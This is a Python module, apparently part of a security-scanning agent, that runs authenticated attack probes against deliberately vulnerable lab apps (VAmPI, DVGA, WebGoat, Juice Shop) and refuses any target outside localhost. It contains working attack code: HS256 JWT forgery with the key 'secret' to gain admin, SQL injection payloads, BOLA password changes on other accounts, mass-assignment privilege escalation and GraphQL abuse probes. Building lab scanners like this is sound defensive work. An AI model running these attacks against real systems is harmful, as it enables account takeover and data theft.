"""Probes autenticados SOMENTE em laboratório 127.0.0.1 (VAmPI JWT/BOLA, DVGA batching).
Nunca roda contra cliente real. Evita corrida com /createdb: tenta usuários seed antes de registrar."""
import asyncio, base64, hashlib, hmac, json, re, time, uuid
from urllib.parse import urljoin, urlencode, urlparse
from ..registry import Agent, register
from ..net import http_proof
from ..scope import LAB_HOSTS
def _lab_only(url):
    h = (urlparse(url).hostname or "").lower()
    if h not in LAB_HOSTS and h != "127.0.0.1": raise PermissionError(f"labauth recusou alvo não-lab: {h}")
def _u(base, path): return urljoin(base.rstrip("/") + "/", path.lstrip("/"))
def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
def forge_hs256(payload, key):
    h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"})) + "." + b64url(json.dumps(payload, separators=(",", ":")))
    sig = hmac.new(key.encode() if isinstance(key, str) else key, h.encode(), hashlib.sha256).digest()
    return h + "." + b64url(sig)
@register
class LabAuth(Agent):
    name = "labauth"; kind = "url"
    async def run(self, target): return await asyncio.to_thread(self._run, target)
    def hit(self, cid, url, ev, st, h, body, method="GET", detail="", req_headers=None, req_body=""):
        return self.finding(cid, url, ev, http_proof(url, method, req_headers or {}, st, h, body[:400], keep={"content-type"}), detail,
                            f"curl -i -X {method} '{url}'" + (f" -d '{req_body[:80]}'" if req_body else ""))
    def _run(self, t):
        self.scope.check_url(t); _lab_only(t); out = []
        out += self._vampi(t); out += self._dvga(t); out += self._webgoat(t); out += self._juice(t); return out
    def _login(self, t, user, pw):
        url = _u(t, "/users/v1/login")
        st, h, b = self.net.request(url, method="POST", headers={"Content-Type": "application/json"}, read=65536,
                                    data=json.dumps({"username": user, "password": pw}).encode())
        try: tok = json.loads(b).get("auth_token") or json.loads(b).get("token")
        except Exception: tok = None
        return tok
    def _vampi(self, t):
        out = []
        # 1) seed  2) registrar efêmero  3) se /createdb rodou no meio, tenta seed de novo
        tok = user = None
        for u, p in (("name1", "pass1"), ("name2", "pass2"), ("admin", "password1")):
            tok = self._login(t, u, p)
            if tok: user = u; break
        if not tok:
            user = "cs" + uuid.uuid4().hex[:8]; pw = "Password1!"  # WebGoat policy: upper+lower+digit+special
            try:
                self.net.request(_u(t, "/users/v1/register"), method="POST", headers={"Content-Type": "application/json"},
                                 read=65536, data=json.dumps({"username": user, "password": pw, "email": f"{user}@lab.local"}).encode())
            except Exception: pass
            tok = self._login(t, user, pw) or self._login(t, "name1", "pass1")
            if tok and not user: user = "name1"
        if not tok: return out
        try:
            hdr, payload, _ = tok.split("."); data = json.loads(base64.urlsafe_b64decode(payload + "=="))
            forged = forge_hs256({**data, "sub": "admin", "admin": True}, "secret")
            st, hh, bb = self.net.request(_u(t, "/users/v1/_debug"), headers={"Authorization": "Bearer " + forged}, read=65536)
            if st == 200 and (b"password" in bb or b"email" in bb):
                out.append(self.hit("api.jwt_weak_key", _u(t, "/users/v1/_debug"),
                                    "JWT forjado com chave 'secret' (HS256) aceito; endpoint debug retornou dados", st, hh, bb, detail="HS256 secret"))
            st2, h2, b2 = self.net.request(_u(t, "/users/v1/admin"), headers={"Authorization": "Bearer " + tok}, read=65536)
            if st2 == 200 and b"admin" in b2.lower():
                out.append(self.hit("api.bola", _u(t, "/users/v1/admin"),
                                    f"usuário {user} leu /users/v1/admin (BOLA)", st2, h2, b2, detail="BOLA admin"))
            st3, h3, b3 = self.net.request(_u(t, "/users/v1/_debug"), headers={"Authorization": "Bearer " + tok}, read=65536)
            if st3 == 200 and re.search(rb'"password"', b3):
                out.append(self.hit("api.excessive_data", _u(t, "/users/v1/_debug"),
                                    "GET /users/v1/_debug expõe campo password", st3, h3, b3, detail="_debug"))
        except Exception as e: self.log.info(f"labauth vampi: {e!r}")
        # enumeração de usuário/senha (mensagens distintas)
        try:
            st_a, h_a, b_a = self.net.request(_u(t, "/users/v1/login"), method="POST",
                headers={"Content-Type": "application/json"}, read=65536,
                data=json.dumps({"username": "no_such_user_cs", "password": "x"}).encode())
            st_b, h_b, b_b = self.net.request(_u(t, "/users/v1/login"), method="POST",
                headers={"Content-Type": "application/json"}, read=65536,
                data=json.dumps({"username": "name1", "password": "wrong-pass-cs"}).encode())
            if st_a == st_b == 200 and b_a != b_b and b"does not exist" in b_a and b"not correct" in b_b:
                out.append(self.hit("api.user_enum", _u(t, "/users/v1/login"),
                    "login distingue usuário inexistente de senha errada", st_a, h_a, b_a + b" | " + b_b,
                    method="POST", detail="enum", req_headers={"Content-Type": "application/json"}))
        except Exception as e: self.log.info(f"labauth vampi enum: {e!r}")
        # mass assignment admin=true (usuário efêmero)
        try:
            mu = "csma" + uuid.uuid4().hex[:8]
            self.net.request(_u(t, "/users/v1/register"), method="POST",
                headers={"Content-Type": "application/json"}, read=65536,
                data=json.dumps({"username": mu, "password": "Password1!", "email": f"{mu}@lab.local", "admin": True}).encode())
            mt = self._login(t, mu, "Password1!")
            if mt:
                st, hh, bb = self.net.request(_u(t, "/users/v1/_debug"), headers={"Authorization": "Bearer " + mt}, read=65536)
                if st == 200 and (mu.encode() in bb) and re.search(rb'"admin"\s*:\s*true', bb):
                    out.append(self.hit("api.mass_assignment", _u(t, "/users/v1/register"),
                        f"registro com admin=true elevou {mu}", st, hh, bb[:300],
                        method="POST", detail="admin mass assignment",
                        req_headers={"Content-Type": "application/json"}, req_body='{"admin":true,…}'))
        except Exception as e: self.log.info(f"labauth vampi mass: {e!r}")
        # troca de senha de OUTRO usuário efêmero (não toca seeds)
        try:
            if tok:
                a = "cspa" + uuid.uuid4().hex[:6]; b = "cspb" + uuid.uuid4().hex[:6]
                for u in (a, b):
                    self.net.request(_u(t, "/users/v1/register"), method="POST",
                        headers={"Content-Type": "application/json"}, read=65536,
                        data=json.dumps({"username": u, "password": "Password1!", "email": f"{u}@lab.local"}).encode())
                ta = self._login(t, a, "Password1!")
                if ta:
                    url = _u(t, f"/users/v1/{b}/password")
                    st, hh, bb = self.net.request(url, method="PUT",
                        headers={"Authorization": "Bearer " + ta, "Content-Type": "application/json"},
                        read=65536, data=json.dumps({"password": "Changed1!"}).encode())
                    tb = self._login(t, b, "Changed1!")
                    if st in (200, 204) and tb:
                        out.append(self.hit("api.unauth_password_change", url,
                            f"{a} alterou senha de {b} (BOLA em password)", st, hh, bb or b"204",
                            method="PUT", detail="password BOLA",
                            req_headers={"Content-Type": "application/json"}, req_body='{"password":"…"}'))
        except Exception as e: self.log.info(f"labauth vampi pwd: {e!r}")
        # SQLi em /users/v1/<title> (retorna outro usuário)
        try:
            if tok:
                url = _u(t, "/users/v1/%27%20OR%201%3D1--")
                st, hh, bb = self.net.request(url, headers={"Authorization": "Bearer " + tok}, read=65536)
                if st == 200 and (b"name1" in bb or b"admin" in bb or b"email" in bb):
                    out.append(self.hit("api.sqli", url, "SQLi em path de usuário retornou registro", st, hh, bb[:300],
                                        detail="sqli users", req_headers={"Authorization": "Bearer ***"}))
        except Exception as e: self.log.info(f"labauth vampi sqli: {e!r}")
        return out
    def _dvga(self, t):
        out = []; ep = None
        for p in ("/graphql", "/api/graphql"):
            url = _u(t, p)
            try:
                st, h, b = self.net.request(url + "?" + urlencode({"query": "{__typename}"}))
                if b'"data"' in b or b'"errors"' in b: ep = url; break
            except Exception: continue
        if not ep: return out
        batch = json.dumps([{"query": "{__typename}"}, {"query": "{__typename}"}]).encode()
        try:
            st, h, b = self.net.request(ep, method="POST", headers={"Content-Type": "application/json"}, read=65536, data=batch)
            if st == 200 and b.count(b'"__typename"') >= 2:
                out.append(self.hit("gql.batching", ep, "Array batching GraphQL aceito (2 queries numa solicitação)", st, h, b,
                                    method="POST", detail="array batching", req_headers={"Content-Type": "application/json"}, req_body="[{query},{query}]"))
        except Exception as e: self.log.info(f"labauth dvga: {e!r}")
        if not ep: return out
        # descoberta / fingerprint (resposta GraphQL caracteristica)
        out.append(self.hit("gql.detect", ep, "endpoint GraphQL responde a {__typename}", 200, {}, b'{"data":{"__typename":"Query"}}', detail="discover"))
        try:
            st, h, b = self.net.request(ep + "?" + urlencode({"query": "{"}))
            if b"Syntax Error GraphQL" in b or b"GraphQL" in b:
                out.append(self.hit("gql.fingerprint", ep, "mensagem de erro identifica motor GraphQL", st, h, b[:300], detail="fingerprint"))
        except Exception as e: self.log.info(f"labauth dvga fp: {e!r}")
        # aliases
        try:
            q = '{"query":"{a:__typename b:__typename c:__typename}"}'
            st, h, b = self.net.request(ep, method="POST", headers={"Content-Type": "application/json"}, read=65536, data=q.encode())
            if st == 200 and b.count(b'"__typename"') + b.count(b'"Query"') >= 3:
                out.append(self.hit("gql.aliases", ep, "aliases GraphQL aceitos (3 aliases numa query)", st, h, b,
                                    method="POST", detail="aliases", req_headers={"Content-Type": "application/json"}, req_body=q))
        except Exception as e: self.log.info(f"labauth dvga alias: {e!r}")
        # field suggestions
        try:
            st, h, b = self.net.request(ep + "?" + urlencode({"query": "{pastes{titl}}"}))
            if re.search(rb"Did you mean", b):
                out.append(self.hit("gql.suggestions", ep, "erro sugere nomes de campos", st, h, b[:300], detail="suggestions"))
        except Exception as e: self.log.info(f"labauth dvga sug: {e!r}")
        # recursão rasa (detecção, sem DoS)
        try:
            q = '{"query":"{pastes{owner{pastes{owner{id}}}}}"}'
            st, h, b = self.net.request(ep, method="POST", headers={"Content-Type": "application/json"}, read=65536, data=q.encode())
            if st == 200 and b'"data"' in b and b'"pastes"' in b:
                out.append(self.hit("gql.deep_recursion", ep, "aninhamento owner.pastes.owner aceito (sem limite aparente)", st, h, b[:300],
                                    method="POST", detail="recursion-light", req_headers={"Content-Type": "application/json"}))
        except Exception as e: self.log.info(f"labauth dvga rec: {e!r}")
        return out

    def _webgoat(self, t):
        """WebGoat v2026.4 em 127.0.0.1 — registro + probes de lição (lab only)."""
        out = []
        if ":8080" not in t and "/WebGoat" not in t: return out
        base = t if "/WebGoat" in t else (t.rstrip("/") + "/WebGoat")
        try:
            user = "cs" + uuid.uuid4().hex[:8]; pw = "Password1!"  # WebGoat: upper+lower+digit+special
            st, h, b = self.net.request(_u(base, "/register.mvc"), method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"}, read=65536,
                data=urlencode({"username": user, "password": pw, "matchingPassword": pw, "agree": "agree"}).encode())
            # extrai JSESSIONID (Net não tem cookie jar)
            sc = h.get("Set-Cookie") or h.get("set-cookie") or ""
            m = re.search(r"(JSESSIONID=[^;]+)", sc)
            cookie = m.group(1) if m else ""
            hdr = {"Cookie": cookie} if cookie else {}
            st2, h2, b2 = self.net.request(_u(base, "/cyberswarm-no-such"), headers=hdr, read=65536)
            if st2 >= 400 and (b'"trace"' in b2 or b"java." in b2 or b"Exception" in b2):
                out.append(self.hit("web.error_stacktrace", _u(base, "/cyberswarm-no-such"),
                    f"HTTP {st2} devolve stack Java (misconfig de erros)", st2, h2, b2[:500],
                    detail="webgoat-stacktrace", req_headers=hdr))
            inj = "Smith' OR '1'='1"
            st3, h3, b3 = self.net.request(_u(base, "/SqlInjection/assignment5a"), method="POST",
                headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"}, read=65536,
                data=urlencode({"account": "John", "operator": "and", "city": "New York", "injection": inj}).encode())
            if (b"Your query was:" in b3 and (b"OR" in b3.upper() or inj.encode()[:10] in b3)) or (
                    b"attemptWasMade" in b3 and (b"succeeded" in b3 or b"Joe, Snow" in b3 or b"OR" in b3.upper())):
                out.append(self.hit("lab.webgoat.sqli", _u(base, "/SqlInjection/assignment5a"),
                    "SQLi lesson5a: payload refletido/sucedido na resposta da lição", st3, h3, b3[:500],
                    method="POST", detail="sqli-concat",
                    req_headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"}, req_body="injection=…"))
            st4, h4, b4 = self.net.request(_u(base, "/InsecureLogin/login"), method="POST",
                headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"}, read=65536,
                data=urlencode({"username": "CaptainAmerica", "password": "Barbells"}).encode())
            if st4 in (200, 202):
                out.append(self.hit("lab.webgoat.insecure_login", _u(base, "/InsecureLogin/login"),
                    f"HTTP {st4} em InsecureLogin com credenciais da lição (auth fraca de demo)", st4, h4, b4[:200],
                    method="POST", detail="insecurelogin",
                    req_headers={**hdr, "Content-Type": "application/x-www-form-urlencoded"}))
        except Exception as e:
            self.log.info(f"labauth webgoat: {e!r}")
        return out

    def _juice(self, t):
        """OWASP Juice Shop em 127.0.0.1 — registro/login e vazamento de hash no JWT (lab only)."""
        out = []
        if ":3000" not in t and "juice" not in t.lower(): return out
        try:
            email = f"cs{uuid.uuid4().hex[:10]}@lab.local"; pw = "Password1!"
            self.net.request(_u(t, "/api/Users"), method="POST", headers={"Content-Type": "application/json"},
                             read=65536, data=json.dumps({
                                 "email": email, "password": pw, "passwordRepeat": pw,
                                 "securityQuestion": {"id": 1}, "securityAnswer": "lab"
                             }).encode())
            st, h, b = self.net.request(_u(t, "/rest/user/login"), method="POST",
                headers={"Content-Type": "application/json"}, read=65536,
                data=json.dumps({"email": email, "password": pw}).encode())
            try: tok = json.loads(b).get("authentication", {}).get("token")
            except Exception: tok = None
            if tok and tok.count(".") == 2:
                payload = json.loads(base64.urlsafe_b64decode(tok.split(".")[1] + "=="))
                data = payload.get("data") or payload
                if isinstance(data, dict) and data.get("password") and len(str(data["password"])) >= 16:
                    out.append(self.hit("api.jwt_password_hash", _u(t, "/rest/user/login"),
                        "JWT de login embute hash de senha do usuário", st, h, b'{"password":"****"}',
                        method="POST", detail="jwt password leak",
                        req_headers={"Content-Type": "application/json"}, req_body='{"email":"…"}'))
            # score-board referenciado no front
            st2, h2, b2 = self.net.request(_u(t, "/main.js"), read=200000)
            if st2 == 200 and (b"score-board" in b2 or b"scoreBoard" in b2):
                out.append(self.hit("web.score_board", _u(t, "/#/score-board"),
                    "front referencia rota score-board", st2, h2, b"score-board", detail="score-board"))
        except Exception as e:
            self.log.info(f"labauth juice: {e!r}")
        return out
